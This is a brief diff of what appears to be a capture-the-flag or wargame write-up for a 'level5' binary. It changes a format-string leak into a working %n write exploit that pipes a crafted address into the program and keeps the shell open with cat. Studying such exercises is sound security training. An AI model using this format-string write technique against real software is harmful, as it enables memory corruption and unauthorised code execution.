@@ -102,7 +102,7 @@ BYTES=$(<<< "$ADDRESS" rev | dd conv=swab | xxd -r -p)
 LENGTH=$((16#$VALUE))
 PADDING=$((LENGTH - ${#BYTES}))
 
-echo "${BYTES}%${PADDING}x%4\$p" | ./level5
+(echo "${BYTES}%${PADDING}x%4\$n"; cat) | ./level5
 ```
 ```sh
 ...
